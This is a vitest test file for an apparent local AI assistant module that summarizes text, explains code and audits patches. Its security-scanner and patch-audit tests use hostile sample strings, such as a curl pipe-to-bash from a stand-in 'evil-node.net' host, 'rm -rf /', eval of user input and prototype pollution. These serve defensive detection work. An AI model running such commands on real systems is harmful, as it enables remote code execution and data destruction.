import { describe, it, expect, beforeEach } from 'vitest';
import {
  LocalAIAssistant,
  aiAssistant,
  AICodeLevel,
  AIAssistantTab,
  ThreadComment,
} from '../src/ai-assistant.js';

describe('LocalAIAssistant Engine & Sovereign NLP Suite', () => {
  let assistant: LocalAIAssistant;

  beforeEach(() => {
    assistant = new LocalAIAssistant();
  });

  // -------------------------------------------------------------------------
  // 1. Initialization & Core State
  // -------------------------------------------------------------------------
  describe('Initialization & Singleton', () => {
    it('initializes with default on-device model and ready state', () => {
      expect(assistant.isLoaded).toBe(true);
      expect(assistant.isProcessing).toBe(false);
      expect(assistant.modelId).toBe('Xenova/LaMini-Flan-T5-783M');
    });

    it('exports singleton instance aiAssistant correctly', () => {
      expect(aiAssistant).toBeInstanceOf(LocalAIAssistant);
      expect(aiAssistant.isLoaded).toBe(true);
    });
  });

  // -------------------------------------------------------------------------
  // 2. Mathematical NLP: TF-IDF Vectorization
  // -------------------------------------------------------------------------
  describe('computeTFIDF Vectorization Engine', () => {
    it('returns empty array when given empty document array', () => {
      const result = assistant.computeTFIDF([]);
      expect(result).toEqual([]);
    });

    it('computes normalized TF-IDF vectors for documents', () => {
      const docs = [
        'Zero knowledge proofs provide sovereign privacy in decentralized protocols.',
        'Decentralized peer-to-peer networks ensure fault tolerance and censorship resistance.',
        'Cryptographic zero knowledge nullifiers prevent double signaling on peer meshes.',
      ];

      const vectors = assistant.computeTFIDF(docs);

      expect(vectors.length).toBe(3);
      for (const vec of vectors) {
        expect(vec).toBeInstanceOf(Map);
        expect(vec.size).toBeGreaterThan(0);

        // Verify L2 Cosine Normalization: sum of squares should approximate 1.0
        let sumSquares = 0;
        for (const val of vec.values()) {
          sumSquares += val * val;
        }
        expect(sumSquares).toBeCloseTo(1.0, 4);
      }

      // Verify domain words have positive weights
      expect(vectors[0].get('knowledge')).toBeGreaterThan(0);
      expect(vectors[0].get('sovereign')).toBeGreaterThan(0);
      expect(vectors[1].get('decentralized')).toBeGreaterThan(0);
    });

    it('handles documents with repeated words and applies sublinear scaling', () => {
      const docs = [
        'crypto crypto crypto crypto protocol',
        'protocol consensus verification',
      ];
      const vectors = assistant.computeTFIDF(docs);
      expect(vectors.length).toBe(2);
      expect(vectors[0].get('crypto')).toBeGreaterThan(0);
      expect(vectors[0].get('protocol')).toBeGreaterThan(0);
    });
  });

  // -------------------------------------------------------------------------
  // 3. N-Gram Key Phrase Extraction
  // -------------------------------------------------------------------------
  describe('extractKeyPhrases Extraction', () => {
    it('returns empty array for empty or whitespace text', () => {
      expect(assistant.extractKeyPhrases('')).toEqual([]);
      expect(assistant.extractKeyPhrases('   \n\t  ')).toEqual([]);
    });

    it('extracts top N salient technical key phrases using unigrams, bigrams, and trigrams', () => {
      const text = `
        The Zero-Knowledge Rollup architecture executes state transitions off-chain
        while generating succinct Groth16 cryptographic proofs. These zk-SNARK circuits
        guarantee deterministic consensus without disclosing private witnesses or user nullifiers.
      `;

      const keyPhrases = assistant.extractKeyPhrases(text, 4);

      expect(keyPhrases).toBeDefined();
      expect(keyPhrases.length).toBeLessThanOrEqual(4);
      expect(keyPhrases.length).toBeGreaterThan(0);

      // Verify phrases are capitalized and contain relevant words
      const combined = keyPhrases.join(' ').toLowerCase();
      expect(
        combined.includes('zero') ||
        combined.includes('knowledge') ||
        combined.includes('rollup') ||
        combined.includes('cryptographic') ||
        combined.includes('proofs') ||
        combined.includes('groth16') ||
        combined.includes('circuits')
      ).toBe(true);
    });

    it('filters out common English stopwords from candidates', () => {
      const text = 'The and of for with in about after is that these those';
      const keyPhrases = assistant.extractKeyPhrases(text, 5);
      expect(keyPhrases.length).toBe(0);
    });
  });

  // -------------------------------------------------------------------------
  // 4. Extractive TextRank Summarization
  // -------------------------------------------------------------------------
  describe('summarizeByExtractiveSentences Summarizer', () => {
    it('returns fallback message for empty text', () => {
      const summary = assistant.summarizeByExtractiveSentences('');
      expect(summary).toBe('No content provided for summarization.');
    });

    it('returns full text if sentence count is less than or equal to requested count', () => {
      const shortText = 'UREfy operates as a decentralized sovereign platform. All data is verified with cryptographic signatures.';
      const summary = assistant.summarizeByExtractiveSentences(shortText, 3);
      expect(summary).toContain('UREfy operates as a decentralized sovereign platform.');
      expect(summary).toContain('All data is verified with cryptographic signatures.');
    });

    it('selects top extractive sentences using centroid similarity and MMR without redundancy', () => {
      const longText = 'UREfy is an autonomous sovereign communication environment. It uses zero-knowledge cryptography to safeguard peer identity and prevent tracking. Local WebAssembly modules execute verification algorithms on the client device directly. All message traffic is routed through encrypted peer-to-peer gossip meshes. Zero cloud dependencies ensure absolute censorship resistance for participants. Validators maintain deterministic state consistency across distributed consensus epochs.';

      const summary = assistant.summarizeByExtractiveSentences(longText, 2);
      expect(summary).toBeDefined();
      expect(summary.length).toBeGreaterThan(0);

      // Should be composed of sentences from the text (markdown cleaner replaces dashes with spaces)
      expect(
        summary.includes('UREfy Omni') ||
        summary.includes('zero knowledge') ||
        summary.includes('WebAssembly') ||
        summary.includes('censorship resistance')
      ).toBe(true);
    });
  });

  // -------------------------------------------------------------------------
  // 5. Security Scanning & Suspicious Pattern Detection
  // -------------------------------------------------------------------------
  describe('detectSuspiciousPatterns & Vulnerability Rules', () => {
    it('returns empty array when code is clean', () => {
      const cleanCode = `
        export function addNumbers(a: number, b: number): number {
          return a + b;
        }
      `;
      const warnings = assistant.detectSuspiciousPatterns(cleanCode);
      expect(warnings).toEqual([]);
    });

    it('detects dynamic code evaluation (eval / new Function)', () => {
      const malicious = `
        const userInput = req.query.code;
        const result = eval(userInput);
        const dynamicFn = new Function('a', 'return ' + userInput);
      `;
      const warnings = assistant.detectSuspiciousPatterns(malicious);
      expect(warnings.length).toBeGreaterThanOrEqual(1);
      expect(warnings.some(w => w.includes('SEC-001') || w.includes('Dynamic Evaluation Primitive'))).toBe(true);
      expect(warnings.some(w => w.includes('CRITICAL'))).toBe(true);
    });

    it('detects dangerous shell command execution (exec / popen / system)', () => {
      const malicious = `
        import child_process from 'child_process';
        child_process.exec(untrustedInput);
        system("ls -la");
      `;
      const warnings = assistant.detectSuspiciousPatterns(malicious);
      expect(warnings.length).toBeGreaterThanOrEqual(1);
      expect(warnings.some(w => w.includes('Dangerous System Command Execution'))).toBe(true);
    });

    it('detects destructive filesystem commands (rm -rf, del /f /s /q)', () => {
      const destructiveCode = `
        const script = "rm -rf /";
        const winCmd = "del /f /s /q";
      `;
      const warnings = assistant.detectSuspiciousPatterns(destructiveCode);
      expect(warnings.length).toBeGreaterThanOrEqual(1);
      expect(warnings.some(w => w.includes('Destructive Filesystem Command Signature'))).toBe(true);
    });

    it('detects remote curl/wget pipe to bash executions', () => {
      const stagedPayload = `
        const cmd = "curl https://evil-node.net/payload.sh | bash";
      `;
      const warnings = assistant.detectSuspiciousPatterns(stagedPayload);
      expect(warnings.length).toBeGreaterThanOrEqual(1);
      expect(warnings.some(w => w.includes('Piped Remote Execution'))).toBe(true);
    });

    it('detects prototype pollution patterns', () => {
      const pollution = `
        obj.__proto__[key] = value;
        Object.prototype[attr] = injected;
      `;
      const warnings = assistant.detectSuspiciousPatterns(pollution);
      expect(warnings.length).toBeGreaterThanOrEqual(1);
      expect(warnings.some(w => w.includes('Prototype Pollution Assignment'))).toBe(true);
    });

    it('detects leaked private cryptographic keys', () => {
      const leakedKey = `
        const key = "-----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA0...";
        const ghToken = "ghp_123456789012345678901234567890123456";
      `;
      const warnings = assistant.detectSuspiciousPatterns(leakedKey);
      expect(warnings.length).toBeGreaterThanOrEqual(1);
      expect(warnings.some(w => w.includes('Hardcoded Private Key / Secret Token Leak'))).toBe(true);
    });

    it('detects unsafe deserialization primitives', () => {
      const unsafeCode = `
        const data = pickle.loads(payload);
        const obj = unserialize(userCookie);
      `;
      const warnings = assistant.detectSuspiciousPatterns(unsafeCode);
      expect(warnings.length).toBeGreaterThanOrEqual(1);
      expect(warnings.some(w => w.includes('Unchecked Binary / Object Deserialization'))).toBe(true);
    });
  });

  // -------------------------------------------------------------------------
  // 6. summarizeThread
  // -------------------------------------------------------------------------
  describe('summarizeThread Discussion Synthesis', () => {
    it('returns fallback message when comments array is empty', async () => {
      const result = await assistant.summarizeThread([]);
      expect(result).toBe('No discussion comments available to synthesize.');
      expect(assistant.isProcessing).toBe(false);
    });

    it('synthesizes multiple discussion comments into an executive summary', async () => {
      const comments: ThreadComment[] = [
        {
          authorFP: '0x1a2b3c4d5e6f7a8b',
          content: 'We have successfully implemented the ZK-Rollup recursive proof verification on the client side.',
        },
        {
          authorFP: '0x9f8e7d6c5b4a3210',
          content: 'The Groth16 circuit latency dropped by 45% after upgrading to WebAssembly SIMD operations. Solid work, approved!',
        },
        {
          authorFP: '0x1a2b3c4d5e6f7a8b',
          content: 'All unit tests and cryptographic invariant checks have verified and passed. Ready to merge into staging branch.',
        },
      ];

      const result = await assistant.summarizeThread(comments);

      expect(result).toContain('**Executive Summary (3-Sentence Synthesis):**');
      expect(result).toContain('**Key Topics:**');
      expect(result).toContain('**Peer Stance:**');
      expect(result).toContain('3 contributions across 2 peers');
      expect(assistant.isProcessing).toBe(false);
    });

    it('detects active technical debate when critique keywords outweigh positive words', async () => {
      const comments: ThreadComment[] = [
        {
          authorFP: '0x1111222233334444',
          content: 'There is a critical bug in the serialization logic. Memory leak occurs during high load.',
        },
        {
          authorFP: '0x5555666677778888',
          content: 'The test fails with severe regression. This broken module is vulnerable to exploit.',
        },
      ];

      const result = await assistant.summarizeThread(comments);
      expect(result).toContain('Active Technical Debate');
    });
  });

  // -------------------------------------------------------------------------
  // 7. explainCode (Beginner, Intermediate, Advanced)
  // -------------------------------------------------------------------------
  describe('explainCode Multi-Tier Technical Breakdown', () => {
    const sampleTsCode = `
      export async function verifyNullifier(nullifier: Uint8Array, epoch: number): Promise<boolean> {
        try {
          const hash = await crypto.subtle.digest('SHA-256', nullifier);
          const view = new Uint8Array(hash);
          for (let i = 0; i < view.length; i++) {
            if (view[i] === 0) return true;
          }
          return false;
        } catch (error) {
          throw new Error('Verification failed');
        }
      }
    `;

    it('generates BEGINNER level code explanation with accessible metaphors', async () => {
      const result = await assistant.explainCode(sampleTsCode, 'typescript', 'beginner');

      expect(result).toContain('AI Code Breakdown (BEGINNER LEVEL)');
      expect(result).toContain('specialized machine');
      expect(result).toContain('Key Concepts');
      expect(result).toContain('Step-by-Step Walkthrough');
      expect(result).toContain('Potential Pitfalls & Edge Cases');
      expect(result).toContain('Architecture & Best Practices');
      expect(assistant.isProcessing).toBe(false);
    });

    it('generates INTERMEDIATE level code explanation with architectural precision', async () => {
      const result = await assistant.explainCode(sampleTsCode, 'typescript', 'intermediate');

      expect(result).toContain('AI Code Breakdown (INTERMEDIATE LEVEL)');
      expect(result).toContain('modular data transformation pipeline');
      expect(result).toContain('**Time:**');
      expect(result).toContain('**Space:**');
      expect(result).toContain('Decoupled business logic');
      expect(assistant.isProcessing).toBe(false);
    });

    it('generates ADVANCED level code explanation with low-level systems insights', async () => {
      const result = await assistant.explainCode(sampleTsCode, 'typescript', 'advanced');

      expect(result).toContain('AI Code Breakdown (ADVANCED LEVEL)');
      expect(result).toContain('High-assurance algorithmic pipeline');
      expect(result).toContain('Zero-cost abstraction');
      expect(result).toContain('Side-channel resilient');
      expect(assistant.isProcessing).toBe(false);
    });

    it('accurately identifies cryptographic concepts and complexity', async () => {
      const cryptoCode = `
        export function computePoseidonMerkleRoot(leaves: Uint8Array[]): Uint8Array {
          const tree = new Array(leaves.length);
          for (let i = 0; i < leaves.length; i++) {
            for (let j = 0; j < leaves.length; j++) {
              // Nested hash
            }
          }
          return tree[0];
        }
      `;
      const result = await assistant.explainCode(cryptoCode, 'typescript', 'advanced');
      expect(result).toContain('Cryptographic Invariants');
      expect(result).toContain('O(N²) — Nested Iteration');
    });
  });

  // -------------------------------------------------------------------------
  // 8. auditPatch (Normal vs Suspicious Diff Auditing)
  // -------------------------------------------------------------------------
  describe('auditPatch Security Review', () => {
    it('audits a clean Git patch and issues a CLEAN verdict', async () => {
      const cleanPatch = `diff --git a/core/math.ts b/core/math.ts
--- a/core/math.ts
+++ b/core/math.ts
@@ -1,4 +1,5 @@
 export function computeSquare(n: number): number {
+  if (n < 0) return 0;
   return n * n;
 }`;

      const auditReport = await assistant.auditPatch(cleanPatch);

      expect(auditReport).toContain('Patch Security Audit Report');
      expect(auditReport).toContain('🟢 CLEAN');
      expect(auditReport).toContain('Risk Score:');
      expect(auditReport).toContain('0/100');
      expect(auditReport).toContain('Zero Security Anomalies Found');
      expect(auditReport).toContain('Safe to merge into local staging branch');
      expect(assistant.isProcessing).toBe(false);
    });

    it('audits a suspicious patch containing eval() and flags CRITICAL severity', async () => {
      const dangerousPatch = `diff --git a/server/evaluator.ts b/server/evaluator.ts
--- a/server/evaluator.ts
+++ b/server/evaluator.ts
@@ -10,3 +10,4 @@
 function executeUserExpression(str: string) {
+  return eval(str);
 }`;

      const auditReport = await assistant.auditPatch(dangerousPatch);

      expect(auditReport).toContain('🔴 CRITICAL RISK');
      expect(auditReport).toContain('Dynamic Evaluation Primitive');
      expect(auditReport).toContain('REJECT PATCH IMMEDIATELY');
      expect(auditReport).toContain('Line:');
    });

    it('audits a destructive patch containing rm -rf and flags high risk score', async () => {
      const destructivePatch = `diff --git a/scripts/clean.sh b/scripts/clean.sh
--- a/scripts/clean.sh
+++ b/scripts/clean.sh
@@ -1,2 +1,3 @@
 #!/bin/bash
+rm -rf /`;

      const auditReport = await assistant.auditPatch(destructivePatch);

      expect(auditReport).toContain('🔴 CRITICAL RISK');
      expect(auditReport).toContain('Destructive Filesystem Command Signature');
    });

    it('audits a patch with dangerous process execution exec()', async () => {
      const execPatch = `diff --git a/launcher.ts b/launcher.ts
--- a/launcher.ts
+++ b/launcher.ts
@@ -5,2 +5,3 @@
+  child_process.exec(cmd);`;

      const auditReport = await assistant.auditPatch(execPatch);

      expect(auditReport).toContain('Dangerous System Command Execution');
      expect(auditReport).toContain('CRITICAL');
    });

    it('audits a patch where a security assertion check is removed (- if (!isValid))', async () => {
      const removedCheckPatch = `diff --git a/auth.ts b/auth.ts
--- a/auth.ts
+++ b/auth.ts
@@ -20,4 +20,2 @@
-  if (!isValidSignature(proof)) {
-    throw new Error("Invalid signature");
-  }
   proceedAction();`;

      const auditReport = await assistant.auditPatch(removedCheckPatch);

      expect(auditReport).toContain('Removed Security Guard / Verification Assertion');
      expect(auditReport).toContain('Broken Access Control');
    });
  });

  // -------------------------------------------------------------------------
  // 9. suggestCompletion
  // -------------------------------------------------------------------------
  describe('suggestCompletion Draft Proposal Engine', () => {
    it('generates comprehensive continuation proposals and tags for drafts', async () => {
      const draft = `
        Proposal for optimizing ZK-SNARK circuits within the UREfy network.
        We optimized the constraint schema to reduce R1CS gate count significantly.
      `;

      const completionMarkdown = await assistant.suggestCompletion(draft);

      expect(completionMarkdown).toContain('Sovereign Draft Completion Suggestions');
      expect(completionMarkdown).toContain('Zero-Knowledge Cryptography & Circuits');
      expect(completionMarkdown).toContain('Technical Deep Dive');
      expect(completionMarkdown).toContain('Actionable Checklist');
      expect(completionMarkdown).toContain('Architectural Trade-Offs');
      expect(completionMarkdown).toContain('#AetherisOmni');
      expect(completionMarkdown).toContain('#ZeroCloud');
      expect(assistant.isProcessing).toBe(false);
    });
  });

  // -------------------------------------------------------------------------
  // 10. UI Rendering (Buttons & Panels)
  // -------------------------------------------------------------------------
  describe('renderAIAssistantButton & renderAIPanel UI Rendering', () => {
    it('renders the compact trigger button with appropriate dataset attributes', () => {
      const btnHtml = assistant.renderAIAssistantButton('post-101');

      expect(btnHtml).toContain('data-ai-trigger-post="post-101"');
      expect(btnHtml).toContain('AI Assist');
      expect(btnHtml).toContain('bg-surface-raised');
      expect(btnHtml).toContain('text-cyphr');
    });

    it('renders hidden panel container when panel is closed initially', () => {
      const panelHtml = assistant.renderAIPanel('post-101', 'Test content');
      expect(panelHtml).toContain('id="ai-panel-container-post-101"');
      expect(panelHtml).toContain('class="hidden"');
    });

    it('renders active open panel with all tabs and action buttons after togglePanel', () => {
      assistant.togglePanel('post-101');
      const panelHtml = assistant.renderAIPanel('post-101', 'UREfy decentralized protocol with ZK proofs.');

      expect(panelHtml).not.toContain('class="hidden"');
      expect(panelHtml).toContain('UREfy Sovereign AI');
      expect(panelHtml).toContain('data-ai-tab="summary"');
      expect(panelHtml).toContain('data-ai-tab="code"');
      expect(panelHtml).toContain('data-ai-tab="security"');
      expect(panelHtml).toContain('data-ai-tab="draft"');
      expect(panelHtml).toContain('data-ai-action="reanalyze"');
      expect(panelHtml).toContain('data-ai-action="close"');
      expect(panelHtml).toContain('data-ai-action="copy"');
      expect(panelHtml).toContain('Summary');
    });

    it('switches tabs and renders corresponding tab views', () => {
      assistant.togglePanel('post-tab-test');

      // Switch to Code Tab
      assistant.switchTab('post-tab-test', 'code');
      let html = assistant.renderAIPanel('post-tab-test', 'function test() { return 42; }');
      expect(html).toContain('Expertise Level:');
      expect(html).toContain('data-ai-code-level="beginner"');
      expect(html).toContain('data-ai-code-level="intermediate"');
      expect(html).toContain('data-ai-code-level="advanced"');
      expect(html).toContain('Time Complexity');

      // Switch to Security Tab
      assistant.switchTab('post-tab-test', 'security');
      html = assistant.renderAIPanel('post-tab-test', 'const x = 1;');
      expect(html).toContain('SECURITY RATING');
      expect(html).toContain('Executive Report:');
      expect(html).toContain('Recommended Action:');

      // Switch to Draft Tab
      assistant.switchTab('post-tab-test', 'draft');
      html = assistant.renderAIPanel('post-tab-test', 'P2P architecture proposal');
      expect(html).toContain('Smart Continuation');
      expect(html).toContain('data-ai-action="insert-draft"');
      expect(html).toContain('Recommended Tags:');

      // Switch code level
      assistant.switchTab('post-tab-test', 'code');
      assistant.switchCodeLevel('post-tab-test', 'advanced');
      html = assistant.renderAIPanel('post-tab-test', 'function test() {}');
      expect(html).toContain('🚀 Advanced / Architect');

      // Close panel
      assistant.closePanel('post-tab-test');
      html = assistant.renderAIPanel('post-tab-test', 'function test() {}');
      expect(html).toContain('class="hidden"');
    });

    it('supports reanalyzeCurrentTab execution', async () => {
      assistant.togglePanel('post-reanalyze');
      assistant.switchTab('post-reanalyze', 'summary');

      await assistant.reanalyzeCurrentTab('post-reanalyze');
      const html = assistant.renderAIPanel('post-reanalyze', 'UREfy sovereign mesh communications.');
      expect(html).toContain('3-Sentence Extractive Summary');
    });
  });
});
